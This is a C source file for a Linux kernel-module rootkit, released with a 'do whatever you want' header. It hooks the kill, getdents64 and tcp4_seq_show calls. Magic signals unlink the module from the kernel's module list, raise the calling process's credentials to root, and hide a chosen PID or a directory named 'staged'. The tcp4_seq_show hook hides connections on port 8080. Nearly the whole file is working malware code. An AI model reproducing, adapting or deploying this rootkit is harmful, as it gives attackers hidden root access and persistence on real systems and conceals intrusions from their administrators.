/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary library includes
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>
#include <linux/list.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/kallsyms.h>
#include "lib/ftrace_helper.h"

//setting up moudle information for kernel module
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sean Kannanaikal");
MODULE_DESCRIPTION("You have been trapped in a genjutsu");
MODULE_VERSION("0.01");

//function prototypes for self written functions
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v);
static asmlinkage int hook_kill(const struct pt_regs *regs);
static asmlinkage int hide_procs_hook_getdents64(const struct pt_regs * regs);
static asmlinkage int hide_dir_hook_getdents64(const struct pt_regs * regs);
void hideRootkit(void);
void elevatePrivilieges(void);

//function pointers system call kill
static asmlinkage long(*orig_kill)(const struct pt_regs *);

//function pointer to system call getdents64 which is used by user mod programs to gett directory items
static asmlinkage long(*orig_getdents64)(const struct pt_regs *);

//function pointers system call kill
static asmlinkage long(*orig_tcp4_seq_show)(struct seq_file *seq, void *v);


//static toggle for proc or dir hiding 
static int installedProc = 0;
static int installedDir = 0;


//a target directory name to hide from being outputted
#define TARGET_DIR "staged"

//a buffer to hold the value of the pid that is desired to be hidden
char hide_pid[NAME_MAX];

//previous model refrence to edit linked list kernel datasturcture
static struct list_head *previous_model;

//array for defining hooks according to xcellerators ftrace helper library function
static struct ftrace_hook hooks[] = {
		HOOK("__x64_sys_kill", hook_kill, &orig_kill),
		HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static struct ftrace_hook hide_dir[] = {
	HOOK("__x64_sys_getdents64",  hide_dir_hook_getdents64, &orig_getdents64),
};

static struct ftrace_hook hide_proc[] = {
	HOOK("__x64_sys_getdents64",  hide_procs_hook_getdents64, &orig_getdents64),
};

/*
@param a sequence file struct and a void pointer
@return result success(0) failure(1)
This function hook will allow us to verify and hide any specific port we specify
*/
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
    struct inet_sock *inet_socket;
    long result;
    unsigned short port = htons(8080); //change this value to desired port you want to hide

    if (v != SEQ_START_TOKEN) {
		
		inet_socket = (struct inet_sock *)v;
		
		//if the source or destination port matches the desired port then don't output the corersponding port connection
		if (port == inet_socket->inet_sport || port == inet_socket->inet_dport) {
			return 0;
		}
	}

	result = orig_tcp4_seq_show(seq, v);
	return result;
}

/*
@param a struct pt_regs which is used by the kernel to pass
prametrs to system calls via registers
@returns integer success(0) or failure(1) 
This function is the hook that is installed in place of the systemcall
kill and go through and hide the kernel module from being listed in lsmod listing
*/
static asmlinkage int hook_kill(const struct pt_regs *regs){
	void hideRootkit(void);
	void elevatePrivilieges(void);

	pid_t desiredPID;
	int sig;
	int error; 
	
	sig = regs->si;
	desiredPID = regs->di;

	//if signal value of 64 passed in hiderootkit
	if(sig == 64){
		hideRootkit();
		return 0;
	}
	//if signal value of 63 passed in elevate to root
	else if(sig == 63){
		elevatePrivilieges();
		return 0;
	}
	//if signal value of 62 passed in set pid to hide
	else if(sig == 62){
		sprintf(hide_pid, "%d", desiredPID);
		return 0;
	}
	//switch hooks to hide process
	else if(sig == 61){
		if(installedDir == 1){
			fh_remove_hooks(hide_dir, ARRAY_SIZE(hide_dir));
			installedDir =  0;
		}

		
		error = fh_install_hooks(hide_proc, ARRAY_SIZE(hide_proc));
		if(error){
			return error;
		}
		installedProc = 1;
		return 0;
	}
	//switch hooks to hide direcotires
	else if(sig == 60){
		if(installedProc == 1){
			fh_remove_hooks(hide_proc, ARRAY_SIZE(hide_proc));
			installedProc =  0;
		}
		
		error = fh_install_hooks(hide_dir, ARRAY_SIZE(hide_dir));
		if(error){
			return error;
		}
		installedDir = 1;
		return 0;
	}

	return orig_kill(regs);
}
/*
@param a struct pt_regs which is used by the kernel to pass
prametrs to system calls via registers
@returns integer success(0) or failure(1) 
This function is the hook that is installed in place of the systemcall
getdents64 and will go through and hide any directories that have the defined
by hide_pid above
*/
static asmlinkage int hide_procs_hook_getdents64(const struct pt_regs * regs){
	//creating various pointers to directory enetries
	struct linux_dirent64 __user *directory_entry = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *directory_entry_kernel_buffer = NULL;
	struct linux_dirent64 *current_directory = NULL;
	struct linux_dirent64 *previous_directory = NULL;
	
	long error;

	unsigned long offset = 0;

	//run the original system call and obtain the result
	int result = orig_getdents64(regs);
	directory_entry_kernel_buffer = kzalloc(result, GFP_KERNEL);

	if((result <= 0) || (directory_entry_kernel_buffer == NULL)){
		return result;
	}
	
	//copy over information into kernel buffer
	error = copy_from_user(directory_entry_kernel_buffer, directory_entry, result); //allocate a kernel buffer to obtain data from userland
	if(error){
		goto done;
	}
	//loop through and check if it matches the pid of hide_pid ...
	while((offset < result) && ((strcmp(hide_pid, "") != 0))){
		current_directory = (void *)directory_entry_kernel_buffer + offset;

		if(memcmp(hide_pid, current_directory->d_name, strlen(hide_pid)) == 0){
				
				//if it does then effectivelly remove the directory by altering the value of d_reclen to a value of the next directory after hide_pid proc
				if(current_directory == directory_entry_kernel_buffer){
					result -= current_directory->d_reclen;
					memmove(current_directory, (void *)current_directory + current_directory->d_reclen, result);
					continue;
				}

				previous_directory->d_reclen += current_directory->d_reclen;

		}else{
			previous_directory = current_directory;
		}


		offset += current_directory->d_reclen;
	}

	//copy the modified kernel buffer back to userland
	error = copy_to_user(directory_entry, directory_entry_kernel_buffer, result);
	if(error){
		goto done;
	}

	done: 
		kfree(directory_entry_kernel_buffer);
		return result;
}

/*
@param a struct pt_regs which is used by the kernel to pass
prametrs to system calls via registers
@returns integer success(0) or failure(1) 
This function is the hook that is installed in place of the systemcall
getdents64 and will go through and hide any directories that have the defined
by TARGET_DIR above
*/
static asmlinkage int hide_dir_hook_getdents64(const struct pt_regs * regs){
	//creating various pointers to directory enetries
	struct linux_dirent64 __user *directory_entry = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 *directory_entry_kernel_buffer = NULL;
	struct linux_dirent64 *current_directory = NULL;
	struct linux_dirent64 *previous_directory = NULL;
	
	long error;

	unsigned long offset = 0;

	//run the original system call and obtain the result
	int result = orig_getdents64(regs);
	directory_entry_kernel_buffer = kzalloc(result, GFP_KERNEL); //allocate a kernel buffer to obtain data from userland

	if((result <= 0) || (directory_entry_kernel_buffer == NULL)){
		return result;
	}
	
	//copy over information into kernel buffer
	error = copy_from_user(directory_entry_kernel_buffer, directory_entry, result);
	if(error){
		goto done;
	}

	//loop through and check if it matches the name of TARGET dir ...
	while((offset < result) && ((strcmp(TARGET_DIR, "") != 0))){
		current_directory = (void *)directory_entry_kernel_buffer + offset;

		//check if target directory is avaialbe in directory listing ...
		if(memcmp(TARGET_DIR, current_directory->d_name, strlen(TARGET_DIR)) == 0){
				
				//if it does then effectivelly remove the directory by altering the value of d_reclen to a value of the next directory after target directory
				if(current_directory == directory_entry_kernel_buffer){
					result -= current_directory->d_reclen;
					memmove(current_directory, (void *)current_directory + current_directory->d_reclen, result);
					continue;
				}

				previous_directory->d_reclen += current_directory->d_reclen;

		}
		else{
			previous_directory = current_directory;
		}


		offset += current_directory->d_reclen;
	}

	//copy the modified kernel buffer back to userland
	error = copy_to_user(directory_entry, directory_entry_kernel_buffer, result);
	if(error){
		goto done;
	}

	done: 
		kfree(directory_entry_kernel_buffer);
		return result;
}

/*
This function will simply alter the kernel linked list dat structure
for keeping track of kernel modules by deleting the current module
from the linked list
*/
void hideRootkit(void){
	previous_model = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

/*
This function will go ahead and elevate the prvlieges of the
current process communicating with the kernel module as such
a quick and easy way to elevate privlieges of a rootshell.
*/
void elevatePrivilieges(void){
	//obtain the crednetials structure used by the kernel evaluate the cred level of process
	struct cred *credentials;
	credentials = prepare_creds();

	if(credentials == NULL){
		return;
	}

	//promote all to 0 or root
	credentials->uid.val = 0;
	credentials->gid.val = 0;
	credentials->euid.val = 0;
	credentials->egid.val = 0;
	credentials->suid.val = 0;
	credentials->sgid.val = 0;
	credentials->fsuid.val = 0;
	credentials->fsgid.val = 0;

	//commit them and make it official
	commit_creds(credentials);
}


//init function to run upon iitilaization of kernel module will install function hook
static int __init hide_kernel_module_init(void){
	int error; 
	error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(error){
		return error;
	}
	return 0;
}

//exit function to run upon removal of kernel module will uninstall function hooks
static void __exit hide_kernel_module_exit(void){
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

//setting init and exit as corresponding functions for initalization and exit
module_init(hide_kernel_module_init);
module_exit(hide_kernel_module_exit);
